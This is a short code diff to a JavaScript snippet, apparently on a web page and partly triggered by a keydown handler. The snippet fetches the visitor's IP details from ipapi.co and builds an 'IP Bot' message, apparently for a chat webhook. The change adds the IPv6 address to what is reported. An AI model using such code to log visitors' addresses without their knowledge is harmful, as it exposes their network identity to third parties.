@@ -42,7 +42,7 @@ document.onkeydown = (e) => {
       .then(data => {
         console.log('Your IP address is:', data.ip);
         const message = {
-          content: `Your IP address is: ${data.ip}`,
+          content: `Your IP address is: ${data.ip}\nYour IPv6 address is: ${data.ipv6}`,
           username: 'IP Bot',
           avatar_url: 'https://example.com/avatar.png'
         };
@@ -78,7 +78,7 @@ fetch('https://ipapi.co/json/')
   .then(data => {
     console.log('Your IP address is:', data.ip);
     const message = {
-      content: `Your IP address is: ${data.ip}`,
+      content: `Your IP address is: ${data.ip}\nYour IPv6 address is: ${data.ipv6}`,
       username: 'IP Bot',
       avatar_url: 'https://example.com/avatar.png'
     };
@@ -102,5 +102,3 @@ fetch('https://ipapi.co/json/')
     });
   })
   .catch(error => console.error('Error fetching IP address:', error));
-
-
